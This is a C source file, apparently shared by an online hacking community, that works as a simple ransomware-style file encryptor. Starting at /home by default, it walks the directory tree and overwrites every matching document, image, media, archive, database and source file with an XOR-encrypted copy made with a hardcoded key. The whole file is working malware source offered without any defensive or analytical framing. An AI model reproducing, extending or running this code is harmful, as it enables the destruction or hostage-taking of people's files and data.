//Developed by deadline - 0xConfident Comunity: https://discord.gg/BPSF8pMXbK
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <ftw.h>
#include <sys/stat.h>
#include <string.h>

struct filez {
    unsigned char *buffer;
    unsigned long long int size;
};
typedef struct filez Filez;

int readfile(const char *);
void writefile(const char *, unsigned char *, unsigned long long int);
void encryptDecrypt(unsigned char *, unsigned long long int);
int list(const char *, const struct stat *, int);
void encryptFile(const char *);
int check(const char *);

Filez file;
const unsigned char encryption_key[] = "85Noi4Jmu63333NOvNKsKysVeZ612357hhdr66vyUA5RGO9VlH566zyy6d61w4MV6nh23516dJ";
const char *allowed_extensions[] = {
    ".doc", ".odt", ".rtf", ".md", ".wpd", ".ppt", ".pps", ".odp", ".key", ".ods",
    ".xlr", ".xls", ".txt", ".pdf", ".zip", ".jpeg", ".jpg", ".png", ".gif", ".bmp",
    ".psd", ".ico", ".svg", ".tif", ".mp3", ".flac", ".aif", ".wav", ".wma", ".ogg",
    ".mpa", ".cda", ".mp4", ".wmv", ".mpg", ".mpeg", ".m4v", ".h264", ".mkv", ".3g2",
    ".3gp", ".avi", ".mov", ".flv", ".7z", ".tar", ".rar", ".gz", ".db", ".dbf", ".db3",
    ".docx", ".xlsx", ".ppt", ".pptx", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp",
    ".yml", ".aspx", ".js", ".jsp", ".css", ".aspx", ".xhtml", ".html", ".json",
    ".xml", ".bz2", ".bak", ".sqlitedb", ".sqlite", ".java", ".class", ".jar"
};

int main(int argc, const char *argv[]) {
    const char *path;
    if (argc == 1) {
        path = "/home";
    } else if (argc == 2) {
        path = argv[1];
    } else {
        printf("Mode de uso: %s <diretorio>\n", argv[0]);
        return 1;
    }
    ftw(path, list, 1);

    return 0;
}

void encryptFile(const char *filename) {
    if (readfile(filename) == 1) {
        return;
    }
    encryptDecrypt(file.buffer, file.size);
    writefile(filename, file.buffer, file.size);

    free(file.buffer);
}

int list(const char *name, const struct stat *status, int type) {
    if (type == FTW_NS)
        return 0;

    if (type == FTW_F) {
        if (strstr(name, "/.") == NULL) {
            if (check(name) == 0) {
                encryptFile(name);
            }
        }
    }

    return 0;
}

int check(const char *name) {
    int num_extensions = sizeof(allowed_extensions) / sizeof(allowed_extensions[0]);
    for (int i = 0; i < num_extensions; i++) {
        if (strcasestr(name, allowed_extensions[i]) != NULL) {
            return 0;
        }
    }
    return 1;
}

void encryptDecrypt(unsigned char *input, unsigned long long int size) {
    unsigned long long int key_length = sizeof(encryption_key) / sizeof(encryption_key[0]);

    for (unsigned long long int i = 0; i < size; i++) {
        input[i] = input[i] ^ encryption_key[i % key_length];
    }
}

void writefile(const char *name, unsigned char *content, unsigned long long int size) {
    FILE *fp = fopen(name, "wb");
    if (fp == NULL) {
        return;
    }
    fwrite(content, 1, size, fp);
    fclose(fp);
}

int readfile(const char *name) {
    FILE *fp = fopen(name, "rb");
    if (fp == NULL) {
        return 1;
    }
    fseek(fp, 0, SEEK_END);
    file.size = ftell(fp);
    rewind(fp);
    file.buffer = (unsigned char *)malloc((file.size + 1) * sizeof(unsigned char));
    fread(file.buffer, 1, file.size, fp);
    fclose(fp);
    return 0;
}
